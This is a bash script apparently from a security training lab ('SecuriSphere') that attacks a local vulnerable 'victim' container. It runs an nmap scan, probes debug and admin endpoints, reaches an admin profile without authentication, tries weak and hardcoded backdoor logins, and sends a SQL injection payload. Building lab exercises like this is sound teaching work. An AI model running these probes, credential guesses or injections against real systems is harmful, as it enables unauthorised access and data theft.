#!/bin/bash
# =============================================================================
# SecuriSphere - Attacker Scripts
# Basic scanning and enumeration against the victim service
# =============================================================================

VICTIM_IP="172.28.0.10"
VICTIM_HOST="victim"
VICTIM_PORT="8000"

echo "============================================="
echo "SecuriSphere Attacker - Victim Scanner"
echo "============================================="
echo ""

# -----------------------------------------------------------------------------
# 1. Basic Connectivity Check
# -----------------------------------------------------------------------------
echo "[*] Testing connectivity to victim..."
ping -c 3 $VICTIM_HOST

echo ""
echo "[*] Checking HTTP service..."
curl -s http://$VICTIM_HOST:$VICTIM_PORT/ | head -20

# -----------------------------------------------------------------------------
# 2. Nmap Port Scan
# -----------------------------------------------------------------------------
echo ""
echo "[*] Running Nmap scan..."
nmap -sV -sC $VICTIM_HOST -p 8000

# -----------------------------------------------------------------------------
# 3. API Enumeration
# -----------------------------------------------------------------------------
echo ""
echo "[*] Enumerating API endpoints..."

echo "  -> Checking /users endpoint..."
curl -s http://$VICTIM_HOST:$VICTIM_PORT/users

echo ""
echo "  -> Checking /debug/config (should be protected)..."
curl -s http://$VICTIM_HOST:$VICTIM_PORT/debug/config

echo ""
echo "  -> Checking /admin/users (should be protected)..."
curl -s http://$VICTIM_HOST:$VICTIM_PORT/admin/users

# -----------------------------------------------------------------------------
# 4. Test Broken Auth - Access user without authentication
# -----------------------------------------------------------------------------
echo ""
echo "[*] Testing Broken Authentication..."
echo "  -> Accessing admin user profile without auth..."
curl -s http://$VICTIM_HOST:$VICTIM_PORT/users/admin

# -----------------------------------------------------------------------------
# 5. Credential Testing
# -----------------------------------------------------------------------------
echo ""
echo "[*] Testing weak credentials..."

echo "  -> Testing admin:admin123..."
curl -s -X POST http://$VICTIM_HOST:$VICTIM_PORT/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"admin123"}'

echo ""
echo "  -> Testing backdoor:letmein (hardcoded backdoor)..."
curl -s -X POST http://$VICTIM_HOST:$VICTIM_PORT/login \
    -H "Content-Type: application/json" \
    -d '{"username":"backdoor","password":"letmein"}'

# -----------------------------------------------------------------------------
# 6. SQL Injection Simulation
# -----------------------------------------------------------------------------
echo ""
echo "[*] Testing SQL injection..."
curl -s "http://$VICTIM_HOST:$VICTIM_PORT/search?q=admin'%20OR%20'1'='1"

echo ""
echo "============================================="
echo "[*] Scan complete!"
echo "============================================="
